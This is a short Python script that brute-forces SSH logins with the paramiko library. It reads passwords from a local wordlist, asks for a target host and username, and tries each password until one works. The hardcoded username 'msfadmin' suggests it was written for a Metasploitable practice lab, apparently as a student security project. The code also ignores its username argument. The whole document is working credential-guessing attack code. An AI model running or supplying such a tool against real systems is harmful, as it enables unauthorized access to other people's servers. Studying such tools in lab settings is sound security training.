import socket 
import paramiko

def crack(hostname, username, password):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(hostname=hostname, username="msfadmin", password=password, timeout=3)
    except socket.timeout:
        print(f"[!] Host: {hostname} is unreachable, timed out.")
        returning = False
    except paramiko.AuthenticationException:
        print(f"[!] Invalid credentials for {username}:{password}")
        returning = False
    else:
        print(f"[+] Found password:{password}")
        returning = True
    finally:
        client.close()
        return returning
with open("/home/nukedukk/Main/edoc/project/BTL-ATTT/function/brute-force/password_list.txt","r") as file:
    lines = file.read().splitlines()
hostname = input("Target hostname :")
username = input("Target username :")
for line in lines:
    if crack(hostname,username,line):
        break